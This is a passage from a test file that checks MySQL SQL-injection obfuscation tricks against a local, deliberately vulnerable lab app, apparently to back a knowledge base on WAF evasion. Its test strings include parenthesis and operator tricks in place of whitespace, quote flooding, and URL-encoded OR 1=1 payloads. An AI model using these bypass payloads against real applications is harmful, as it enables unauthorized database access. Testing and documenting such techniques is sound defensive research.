    test("SELECT.1e1 - decimal notation does NOT work in MySQL", async () => {
      // Unlike PostgreSQL, MySQL does NOT allow .1e1 directly after SELECT
      const result = await mysqlDirectSQL("SELECT.1e1 AS val");
      expect(result.success).toBe(false);
    });

    test("UNION SELECT without space using parentheses", async () => {
      // UNION(SELECT...) works
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT 1 AS val UNION(SELECT 2)");
      expect(rows.length).toBe(2);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Parentheses as Whitespace Alternatives
   */
  describe("Parentheses as whitespace alternatives", () => {
    test("UNION(SELECT...) - no space before SELECT", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION(SELECT 999, 'paren_test')"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("paren_test");
    });

    test("SELECT(column)FROM(table)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT(username)FROM(users)WHERE(id=1)");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Nested parentheses", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT id, username FROM users WHERE id = 1 UNION((SELECT 999, 'nested'))"
      );
      const usernames = rows.map((r) => (r as { username: string }).username);
      expect(usernames).toContain("nested");
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Characters After AND/OR
   */
  describe("Characters after AND/OR", () => {
    test("Plus sign after OR (OR+1)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 999 OR+1");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Minus sign after AND (AND-1=-1)", async () => {
      const { rows } = await mysqlDirectSQLExpectSuccess(
        "SELECT * FROM users WHERE id = 1 AND-1=-1"
      );
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Tilde after OR (OR~0)", async () => {
      // ~0 = -1 (bitwise NOT of 0), which is truthy
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 999 OR~0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("Exclamation after AND (AND!0)", async () => {
      // !0 = 1 (logical NOT of 0)
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT * FROM users WHERE id = 1 AND!0");
      expect(rows.length).toBeGreaterThan(0);
    });

    test("At sign after OR (OR@var)", async () => {
      // @var is NULL by default, so OR @var should work
      const result = await mysqlDirectSQL("SELECT * FROM users WHERE id = 1 OR@a");
      // This might work or fail depending on strict mode
      expect(result.success).toBeDefined();
    });
  });

  /**
   * MySQL version detection
   */
  describe("MySQL Version Info", () => {
    test("Can retrieve MySQL version", async () => {
      const version = await getMySQLVersion();
      console.log(
        `MySQL version: ${version.full} (major: ${version.major}, minor: ${version.minor})`
      );
      expect(version.major).toBeGreaterThanOrEqual(5);
    });
  });

  /**
   * @kb-entry mysql/fuzzing-obfuscation
   * @kb-section Quote Flooding
   *
   * Quote flooding uses excessive escaped quotes ('') to confuse WAFs that
   * count quotes to detect injection. In MySQL, '' inside a string is an
   * escaped single quote. Odd number of quotes after opening = escaped quotes + close.
   */
  describe("Quote flooding", () => {
    test("Basic quote flooding with UNION - valid syntax", async () => {
      // '1''''''''''''' = string "1" + 6 escaped quotes (12 chars) + close quote = "1''''''"
      // Then UNION SELECT '2' is a real UNION clause
      const result = await mysqlDirectSQL("SELECT '1'''''''''''''UNION SELECT '2'");
      expect(result.success).toBe(true);
      expect(result.result?.rows.length).toBe(2);
      // Column name is from first SELECT ("1''''''"), both rows use it
      const colName = "1''''''";
      expect(result.result?.rows[0]).toHaveProperty(colName);
      expect(result.result?.rows[0][colName]).toBe("1''''''");
      // Second row value is '2' (from UNION SELECT '2')
      expect(result.result?.rows[1][colName]).toBe("2");
    });

    test("Quote flooding - parsed string value verification", async () => {
      // Verify we understand the parsing: 13 quotes after '1' =
      // 6 pairs of '' (escaped) + 1 closing quote = string "1''''''"
      const { rows } = await mysqlDirectSQLExpectSuccess("SELECT '1''''''''''''' AS val");
      expect(rows[0].val).toBe("1''''''");
    });

    test("Quote flooding in WHERE clause with injection", async () => {
      // Simulates: WHERE id = '[user_input]'
      // User input: 1'''''''''''''OR'1'='1
      // Full: WHERE id = '1'''''''''''''OR'1'='1'
      const result = await mysqlDirectSQL(
        "SELECT id FROM users WHERE id = '1'''''''''''''OR'1'='1'"
      );
      expect(result.success).toBe(true);
      // The string '1'''''' gets compared, then OR '1'='1' makes it return all rows
      expect(result.result?.rows.length).toBeGreaterThanOrEqual(1);
    });

    test("Even number of quotes produces different result", async () => {
      // Even quotes (12) = 6 escaped pairs, no closing, so next char is in string
      // '1'''''''''''' (12 quotes after 1) UNION would have UNION inside the string
      const result = await mysqlDirectSQL("SELECT '1''''''''''''UNION SELECT ''2'");
      expect(result.success).toBe(true);
      // With 12 quotes: string becomes "1''''''UNION SELECT " + "2" from next ''
      // This is ONE row with the UNION as part of the string value
      expect(result.result?.rows.length).toBe(1);
    });
  });
});

/**
 * HTTP Layer Tests - Verify whitespace behavior through web application
 *
 * These tests verify whether URL encoding and HTTP layer processing
 * affects whitespace handling in SQL queries.
 */
describe("MySQL Whitespace via HTTP Layer", () => {
  let server: Awaited<ReturnType<typeof startServer>> | undefined;
  let port: number;

  beforeAll(async () => {
    logger.setLevel("warn");
    server = await startServer({
      port: 0, // Let OS assign an available port
      dbType: "mysql",
      dbHost: process.env.MYSQL_HOST ?? "localhost",
      dbPort: parseInt(process.env.MYSQL_PORT ?? "3306", 10),
      dbUser: process.env.MYSQL_USER ?? "root",
      dbPassword: process.env.MYSQL_PASSWORD ?? "testpass",
      dbName: process.env.MYSQL_DATABASE ?? "vulndb",
    });
    // Get the actual port assigned by the OS
    const addr = server.server.address();
    if (addr && typeof addr === "object") {
      port = addr.port;
    } else {
      throw new Error("Failed to get server address");
    }
  }, 30000);

  afterAll(async () => {
    if (server) {
      server.server.close();
      await server.cleanup();
    }
  }, 10000);

  /**
   * Helper to execute SQL through HTTP /sql endpoint
   */
  async function httpSQL(
    query: string
  ): Promise<{ success: boolean; rows?: unknown[]; error?: string }> {
    try {
      const response = await fetch(`http://localhost:${port}/sql`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ query }),
      });

      // Always try to read JSON body (server returns JSON even on 500 errors)
      try {
        return (await response.json()) as { success: boolean; rows?: unknown[]; error?: string };
      } catch {
        const text = await response.text();
        if (!response.ok) {
          return {
            success: false,
            error: `${response.status} ${response.statusText}: ${text.slice(0, 100)}`,
          };
        }
        return { success: false, error: `Invalid JSON response: ${text.slice(0, 100)}` };
      }
    } catch (error) {
      return { success: false, error: error instanceof Error ? error.message : String(error) };
    }
  }

  describe("Whitespace characters via HTTP POST (JSON body)", () => {
    test("Space (0x20) works via HTTP", async () => {
      const result = await httpSQL("SELECT 1 AS val");
      expect(result.success).toBe(true);
    });

    test("Tab (0x09) works via HTTP", async () => {
      const result = await httpSQL("SELECT\t1 AS val");
      expect(result.success).toBe(true);
    });

    test("Newline (0x0A) works via HTTP", async () => {
      const result = await httpSQL("SELECT\n1 AS val");
      expect(result.success).toBe(true);
    });

    test("0xA0 (NBSP) does NOT work via HTTP - confirms MySQL lexer behavior", async () => {
      const nbsp = String.fromCharCode(0xa0);
      const result = await httpSQL(`SELECT${nbsp}1 AS val`);

      // Should fail because MySQL lexer doesn't accept 0xA0 as whitespace
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/syntax/i);
    });
  });

  describe("URL-encoded whitespace via HTTP GET", () => {
    /**
     * Test URL-encoded characters in query parameters
     * The web server (Express) decodes URL-encoded chars before processing
     */
    test("URL-encoded space (%20) works in injection", async () => {
      // This tests: /users?id=1%20OR%201=1
      const response = await fetch(`http://localhost:${port}/users?id=1%20OR%201=1`);
      const data = (await response.json()) as { users: unknown[] };
      // Should return multiple users due to OR 1=1
      expect(data.users.length).toBeGreaterThan(1);
    });

    test("URL-encoded tab (%09) works in injection", async () => {
      const response = await fetch(`http://localhost:${port}/users?id=1%09OR%091=1`);
      const data = (await response.json()) as { users: unknown[] };
      expect(data.users.length).toBeGreaterThan(1);
    });

    test("URL-encoded newline (%0A) works in injection", async () => {
      const response = await fetch(`http://localhost:${port}/users?id=1%0AOR%0A1=1`);
      const data = (await response.json()) as { users: unknown[] };
      expect(data.users.length).toBeGreaterThan(1);
    });

    test("URL-encoded 0xA0 (%A0) does NOT work - MySQL rejects it", async () => {
      // %A0 = 0xA0 (NBSP) - MySQL should reject this
      const response = await fetch(`http://localhost:${port}/users?id=1%A0OR%A01=1`);
      const data = (await response.json()) as { error?: string };

      console.log(`HTTP %A0 test response:`, data);

      // MySQL treats '1<0xA0>OR<0xA0>1' as a single identifier, not 1 OR 1
      // Error is "Unknown column '1�OR�1'" because it's parsed as one token
      expect(response.status).toBe(500);
      // Could be "syntax" or "Unknown column" depending on context
      expect(data.error).toMatch(/syntax|Unknown column/);
    });

    test("Mixed URL-encoded whitespace (%09%0A%0D) works", async () => {
      const response = await fetch(`http://localhost:${port}/users?id=1%09%0AOR%0D1=1`);
      const data = (await response.json()) as { users: unknown[] };
      expect(data.users.length).toBeGreaterThan(1);
    });
  });

  describe("HTTP layer does not transform 0xA0", () => {
    test("Verify Express passes 0xA0 unchanged to MySQL", async () => {
      // This confirms the HTTP layer (Express) doesn't normalize 0xA0 to space
      // If it did, the query would succeed. Since it fails, 0xA0 reaches MySQL intact.
      const nbsp = String.fromCharCode(0xa0);
      const result = await httpSQL(
        `SELECT${nbsp}username${nbsp}FROM${nbsp}users${nbsp}LIMIT${nbsp}1`
      );

      console.log(`Full query with NBSP result: success=${result.success}`);

      // Fails because MySQL receives 0xA0 and rejects it
      expect(result.success).toBe(false);
    });
  });

  describe("Quote flooding via HTTP", () => {
    test("Quote flooding with UNION through HTTP layer", async () => {
      // Test the documented example through the web app
      const result = await httpSQL("SELECT '1'''''''''''''UNION SELECT '2'");
      expect(result.success).toBe(true);
      expect(result.rows?.length).toBe(2);
    });
  });
});
